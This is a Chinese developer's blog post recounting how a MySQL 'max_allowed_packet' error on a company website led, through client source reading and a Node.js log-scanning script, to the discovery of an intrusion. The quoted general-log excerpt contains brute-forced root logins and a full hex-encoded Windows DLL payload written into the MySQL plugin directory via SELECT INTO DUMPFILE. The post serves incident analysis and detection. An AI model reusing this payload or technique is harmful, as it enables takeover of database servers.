<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题 · 码工严彬 coding不仅仅是工作</title><meta name="description" content="mysql入侵 max_allowed_packet"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/2015/12/20/self-introduce/" target="_self" class="nav-list-link">WECHAT</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题</h1><div class="post-meta"><div class="post-time">2016年6月23日</div></div><div class="post-content"><h2 id="情况"><a href="#情况" class="headerlink" title="情况"></a>情况</h2><p>最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。<br>查找错误日志,以下为错误堆栈信息:<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MySql.Data.MySqlClient.MySqlException (<span class="number">0x80004005</span>): Packets larger than max_allowed_packet are not allowed.</span><br><span class="line">在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)</span><br><span class="line">在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)</span><br><span class="line">在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)</span><br><span class="line">在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)</span><br><span class="line">在 MySql.Data.MySqlClient.Statement.ExecuteNext()</span><br><span class="line">在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)</span><br><span class="line">在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)</span><br><span class="line">在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`<span class="number">1.</span>Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`<span class="number">3</span> operation, TInterceptionContext interceptionContext, Action`<span class="number">3</span> executing, Action`<span class="number">3</span> executed)</span><br><span class="line">在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)</span><br><span class="line">在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)</span><br></pre></td></tr></table></figure></p>
<p>问题原因是:Packets larger than max_allowed_packet are not allowed.<br>查看官网解释:<br>When a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.<br>Both the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.<br>按官文文档的解释是你的sql命令太长。</p>
<h2 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h2><p>随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。<br>出错源码为MysqlSteam.cs</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendPacket</span>(<span class="params">MySqlPacket packet</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = packet.Buffer;</span><br><span class="line">    <span class="keyword">int</span> length = packet.Position - <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">ulong</span>)length &gt; maxPacketSize)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MySqlException(Resources.QueryTooLarge (<span class="keyword">int</span>)MySqlErrorCode.PacketTooLarge);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (length &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> lenToSend = length &gt; maxBlockSize ? maxBlockSize : length;</span><br><span class="line">        buffer[offset] = (<span class="keyword">byte</span>)(lenToSend &amp; <span class="number">0xff</span>);</span><br><span class="line">        buffer[offset + <span class="number">1</span>] = (<span class="keyword">byte</span>)((lenToSend &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buffer[offset + <span class="number">2</span>] = (<span class="keyword">byte</span>)((lenToSend &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buffer[offset + <span class="number">3</span>] = sequenceByte++;</span><br><span class="line">        </span><br><span class="line">        outStream.Write(buffer, offset, lenToSend + <span class="number">4</span>);</span><br><span class="line">        outStream.Flush();</span><br><span class="line">        length -= lenToSend;</span><br><span class="line">        offset += lenToSend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查找maxPacketSize的来源<br>Driver.cs<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">MySqlConnection connection</span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> firstConfigure = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we have not already configured our server variables</span></span><br><span class="line">    <span class="comment">// then do so now</span></span><br><span class="line">    <span class="keyword">if</span> (serverProps == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    firstConfigure = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// if we are in a pool and the user has said it's ok to cache the</span></span><br><span class="line">	<span class="comment">// properties, then grab it from the pool</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Pool != <span class="literal">null</span> &amp;&amp; Settings.CacheServerProperties)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> (Pool.ServerProperties == <span class="literal">null</span>)</span><br><span class="line">          Pool.ServerProperties = LoadServerProperties(connection);</span><br><span class="line">            serverProps = Pool.ServerProperties;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            serverProps = LoadServerProperties(connection);</span><br><span class="line">        </span><br><span class="line">        LoadCharacterSets(connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (MySqlException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// expired password capability</span></span><br><span class="line">        <span class="keyword">if</span> (ex.Number == <span class="number">1820</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            IsPasswordExpired = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">	.......</span><br><span class="line">	<span class="keyword">if</span> (serverProps.ContainsKey(<span class="string">"max_allowed_packet"</span>))</span><br><span class="line">	    maxPacketSize = Convert.ToInt64(serverProps[<span class="string">"max_allowed_packet"</span>]);</span><br><span class="line">	.......</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续查找LoadServerProperties，仍在Driver.cs中</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Dictionary&lt;<span class="keyword">string</span>,<span class="keyword">string</span>&gt; LoadServerProperties(MySqlConnection connection)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// load server properties</span></span><br><span class="line">    Dictionary&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt; hash = <span class="keyword">new</span> Dictionary&lt;<span class="keyword">string</span>, <span class="keyword">string</span>&gt;();</span><br><span class="line">    MySqlCommand cmd = <span class="keyword">new</span> MySqlCommand(<span class="string">"SHOW VARIABLES"</span>, connection);</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (MySqlDataReader reader = cmd.ExecuteReader())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (reader.Read())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> key = reader.GetString(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">string</span> <span class="keyword">value</span> = reader.GetString(<span class="number">1</span>);</span><br><span class="line">                hash[key] = <span class="keyword">value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Get time zone offset as numerical value</span></span><br><span class="line">        timeZoneOffset = GetTimeZoneOffset(connection);</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        MySqlTrace.LogError(ThreadID, ex.Message);</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端的max_allowed_packet也是从服务器获取下来的.<br>所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。<br>set global general_log = on</p>
<p>当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line">var str = &quot;&quot;;</span><br><span class="line">fs.readFile(&apos;mysql.log&apos;, &apos;utf8&apos;, function (err, data) &#123;</span><br><span class="line">    if (err) throw err;</span><br><span class="line">    str = data;</span><br><span class="line">    searchkey = &apos;Query SELECT&apos;;</span><br><span class="line">    var pos = str.indexOf(searchkey);</span><br><span class="line">    var arr=new Array();</span><br><span class="line">    arr[0] = pos;</span><br><span class="line">    var k = 1;</span><br><span class="line">    var count = 0;</span><br><span class="line">    while (pos !== -1) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        pos = str.indexOf(searchkey, pos + 1);</span><br><span class="line">        arr[k] = pos;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    var max =0;</span><br><span class="line">    var maxindex = 0;</span><br><span class="line">    for (var i=0;i&lt;arr.length-2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        var temp = arr[i+1] -arr[i];</span><br><span class="line">        if (temp&gt;max)</span><br><span class="line">        &#123;</span><br><span class="line">            max = temp;</span><br><span class="line">            maxindex =i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(max);</span><br><span class="line">    var txt = &quot;max:&quot;+max+&quot;\n\r&quot;;</span><br><span class="line">    txt= txt + str.substr(arr[maxindex],max)</span><br><span class="line">    fs.writeFile(&apos;result.txt&apos;, txt, function (err) &#123;</span><br><span class="line">        if (err) throw err;</span><br><span class="line">        console.log(&apos;It\&apos;s saved!&apos;); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>执行程序查询日志之后发现我们的mysql已被人入侵<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">160623 18:35:05	84 Connect	root@114.55.39.75 on mysql</span><br><span class="line">84 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:08	85 Connect	root@114.55.39.75 on mysql</span><br><span class="line">85 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:11	86 Connect	root@114.55.39.75 on mysql</span><br><span class="line">86 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:15	87 Connect	root@114.55.39.75 on mysql</span><br><span class="line">87 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:17	88 Connect	root@114.55.39.75 on mysql</span><br><span class="line">88 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:18	89 Connect	root@114.55.39.75 on mysql</span><br><span class="line">89 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:21	90 Connect	root@114.55.39.75 on mysql</span><br><span class="line">90 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:23	91 Connect	root@114.55.39.75 on mysql</span><br><span class="line">91 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:26	92 Connect	root@114.55.39.75 on mysql</span><br><span class="line">92 Connect	Access denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class="line">160623 18:35:34	93 Connect	root@114.55.39.75 on mysql</span><br><span class="line">160623 18:35:35	93 Query	<span class="keyword">set</span> autocommit=<span class="number">0</span></span><br><span class="line"><span class="number">160623</span> <span class="number">18</span>:<span class="number">35</span>:<span class="number">36</span>	<span class="number">93</span> Quit	</span><br><span class="line"><span class="number">160623</span> <span class="number">18</span>:<span class="number">35</span>:<span class="number">37</span>	<span class="number">94</span> <span class="keyword">Connect</span>	root@<span class="number">114.55</span><span class="number">.39</span><span class="number">.75</span> <span class="keyword">on</span> mysql</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">set</span> autocommit=<span class="number">0</span></span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">SELECT</span> <span class="keyword">VERSION</span>()</span><br><span class="line"><span class="number">160623</span> <span class="number">18</span>:<span class="number">35</span>:<span class="number">38</span>	<span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">set</span> @a = <span class="keyword">concat</span>(<span class="string">''</span>,<span class="number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000EF55A8C1AB34C692AB34C692AB34C692C42BCC92AF34C692C42BC292A934C692AB34C692A834C692AB34C792B834C692C92BD592AC34C6929D12CD92A934C6925414C292AA34C69252696368AB34C692000000000000000000000000000000000000000000000000504500004C0103000E6DFF4F0000000000000000E0000E210B01060000100000001000000050000020660000006000000070000000000010001000000002000004000000000000000400000000000000008000000010000000000000020000000000100000100000000010000010000000000000100000006C71000070000000007000006C010000000000000000000000000000000000000000000000000000DC7100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000008000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000C0000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303400555058210D0902081292E561117752FFF14200001406000000500000260100C02F775FFE8B4C2408B801003BC8750A0C04890D21D8C2FCF676EC0C0090008B4412C7400813100432C0C3EE6FDFBE81EC34020C5355568D1810575033F6682E6E77FBDD906813808974241CC71528044DFF15315DB7BDFD0085C075208D531C8D542B515C183428D8EDD8EF52505633845123048B1B14520ADC5DFBEE08B9660033C08D7C244B20F3AB2ED375DDFF3F2850516A01565A383774073C5BB77B4D5C44B80750007FE80C03FB7BEBBA524D2835182F506A03663C568912768FFD6F2C1B4C8BAC244C0260942440398B1DFFFF7FEF74108B4D0827208B790483C9FFF2AEF7D12BF98BC18BF78BFA63DFFFFFC1E902F3A58BC883E103F3A4FFD38D8C24AC6D840694DBBB3F7303C01483BC24BC0D0275558B1BB0EEDEFD3783E804743E48740E48F6487543BF5D14EB41FF5E83E91CB4120B17150CEB2B83EFDDCFD8F802250704EB1B0620FCEB1413D6DC217F0AF0EB09E89DBA9F58B0367B6A00A107A3C1ED6B77B1A8CE8B115218F1586CEF164CF70F85D500E93513062620A8FFD6CAC9EDDD8B3D0E1C68102715FFD7886CD662C10F4AEE1406EFFFB16F840470EC3C8BF083C40885F674165614C2DBD8916C38560634190C8DBC599F139E2CAA83C177E6308BB4E11BB608802704D44889460C5154FBD8EF83C352514D40502A2C8B7E0C40750BDB162714438BAB54335F7FFCD6B84B49899F325E5D5B81C482C38B45DE2C65BB08268B386965703E4343C0691752186710422E994084080B3F256C90000F8B400C5974EB4ED8B30846405921FF25134C05B8A11B1948543108F50E39052FECBE6F59DC7E2EFF0D078B051024FE018B09CB21FD4871E0753F6880383059BEF7B7BBA314E875049EEB66832000A10DBC041FBBE1FB04001CE4E204A6FF555959EB3D6AAF8B756339269B305E21E3D8FF5FA471FC3BF072128B0E85C97407FFD11E83EE672DFD1D6CEABB83251100595E2F5885FFDF30F2C1EC538B5D08568B750C578B7D10E76DB4FFF77509833D5F00EB2683FE01740504E62287E97EF364EC09575653FFD0080C6FDDFDFBDC5E82B04E0FA3FBFFFF3389450CDF60ADAE4C17372B23F64603BBDD0ED8752634032125837D7F74115BFBD6450E083C8B025F5E5B5D9C88223B824D280000DF2E7FA877726F6E672E6F6B0328257329DBCBF6FF20706F72746E756D626572200F646F73760A7304D8FBB66925201E002728FFFFADB9002B03633A5C57696E646F77735C76332E6C6F6BBFE4BB6717612B62004374656D70040384BD6F7F3230395C6D61142E657865371F9574FFFE6973657475701A202D6F223D77DAB7EDDB221A70616263057963556E6B6E1E6CF7DEDE07546F6F2F6C64218F50585007EE6F83FC32303033302368652D6E65770BF7BF05B2387737410064006D0069006E03AFB9AE7D7300740072C9056F070D006EEC7FB2611F6C0076003100320033177013A4E1CC6D2365252750394EFDFF0B4159595354454D5C43757272656E74436FED60DBB60372AE53735C0A5C5425FE19B6B76D90616C201472609D5374617400B4BF1967A15244502D5463A4C8561484230CB2398A0AB01010806DF9FF0144656C65746546696C6541470A566DBBDD91BC45780E57690765630853FB9F66BB1D657034BD0052656743726561376BDF8E7D4B6579410E5175377956616C063969B6F717206C6F731F36CA24E0CDFDFF5F61646A7573745F666469760D5D697474DB6E6F0DD60A7370720C7466086D41F7EEED5A367066633D077075747306D36C9B796F70656E73654ED548B5B16FDB4EAD5524724164640B4C386B0276BF3D47726F7570114D6557732D5BFB9F66E25455524C446F776E578454FDFF63B36FEF00172F171D070B260827200839251610FFFFFFBF0A0B212007080E0E070705060F06071D24073F2207471406060E08060B0DEDFFAD6D180500060A150C0622125C1C005045416F8351FF4C0104000E6DFF4F43E00D210B019C7D7684062A0030130D14000F20969D278F10001004000717A40BD650272A02029AEDD9B207067022076E5CF2818CEA4F78DC4000008406922E40575C2E5BF67417B87874B8B0100342CFB6F121602E72642661CCDE2062876C0903A2402E26940CD2DC27F001303036D91CDBC04F652010BC27657353724042043E210000B8870AE5480412000000FF000000000000000000000000807C2408010F85B901000060BE006000108DBE00B0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9070000008A07472CE83C0177F7803F0175F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9678600000958A074708C074DC89F95748F2AE55FF967C60000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE806000008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E924ACFFFF0000000000000000000000000000000000000000000000000000000000000000000000B070000078700000000000000000000000000000BD70000090700000000000000000000000000000CA70000098700000000000000000000000000000D5700000A0700000000000000000000000000000E2700000A87000000000000000000000000000000000000000000000EC700000FA7000000A7100001A7100002871000000000000367100000000000044710000000000004A7100000000000056710000000000004B45524E454C33322E444C4C0041445641504933322E646C6C004D53564352542E646C6C004E455441504933322E646C6C0075726C6D6F6E2E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000526567436C6F73654B65790000006672656500004E657455736572416464000055524C446F776E6C6F6164546F46696C65410000000000000E6DFF4F00000000B271000001000000030000000300000094710000A0710000AC710000301000003013000020100000BC710000C2710000CF7100000000010002006D7973716C2E646C6C007870646C33007870646C335F6465696E6974007870646C335F696E6974000000006000000C0000002D360000000000000000000000000000000000000000000000000000</span>)</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">use</span> mysql</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> yongger2</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">SHOW</span> <span class="keyword">WARNINGS</span></span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">create</span> <span class="keyword">table</span> yongger2(<span class="keyword">data</span> LONGBLOB)</span><br><span class="line"><span class="number">160623</span> <span class="number">18</span>:<span class="number">35</span>:<span class="number">39</span>	<span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">insert</span> <span class="keyword">into</span> yongger2 <span class="keyword">values</span>(<span class="string">""</span>)</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">update</span> yongger2 <span class="keyword">set</span> <span class="keyword">data</span> = @a</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">set</span> @dir2 = <span class="keyword">concat</span>(<span class="string">'select data from yongger2 into DUMPFILE "'</span>,@@plugin_dir,<span class="string">'\\cna12.dll"'</span>)</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">set</span> @dir2 = <span class="keyword">replace</span>(@dir2,<span class="string">'\\'</span>,<span class="string">'\\\\'</span>)</span><br><span class="line"><span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">set</span> @dir2 = <span class="keyword">replace</span>(@dir2,<span class="string">"/"</span>,<span class="string">"\\\\"</span>)</span><br><span class="line"><span class="number">160623</span> <span class="number">18</span>:<span class="number">35</span>:<span class="number">40</span>	<span class="number">94</span> <span class="keyword">Query</span>	<span class="keyword">prepare</span> sql3 <span class="keyword">from</span> @dir2</span><br><span class="line"><span class="number">94</span> <span class="keyword">Prepare</span>	<span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> yongger2 <span class="keyword">into</span> <span class="keyword">DUMPFILE</span> <span class="string">"C:\\Program Files (x86)\\MySQL\\MySQL Server 5.6\\lib\\plugin\\\\cna12.dll"</span></span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">后面<span class="number">1</span>W行省略</span><br></pre></td></tr></table></figure></p>
<p>后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。<br>然后。。。。我就没有然后了。。。。。。。。。。。。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>遇到这种情况，好像只能重装系统了。<br>特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。<br>PS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）</p>
</div></article></div><div data-thread-key="2016/06/23/hishop-4/" data-title="mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题" data-url="http://binyanbin.github.io/2016/06/23/hishop-4/" class="ds-share flat"><div class="ds-share-inline"><div class="ds-share-icons-16"><li data-toggle="ds-share-icons-more"><a href="javascript:void(0)" class="ds-more">分享到:</a></li><li><a href="javascript:void(0);" data-service="weibo" class="ds-weibo">微博</a></li><li><a href="javascript:void(0);" data-service="qzone" class="ds-qzone">QQ空间</a></li><li><a href="javascript:void(0);" data-service="qqt" class="ds-qqt">QQ微博</a></li><li><a href="javascript:void(0);" data-service="wechat" class="ds-wechat">微信</a></li><div class="ds-share-icons-more"></div></div></div></div></section><footer><div class="paginator"><a href="/2016/07/01/idea-1/" class="prev">上一篇</a><a href="/2016/06/07/hishop-3/" class="next">下一篇</a></div><div data-thread-key="2016/06/23/hishop-4/" data-title="mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题" data-url="http://binyanbin.github.io/2016/06/23/hishop-4/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"binyanbin"};
(function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
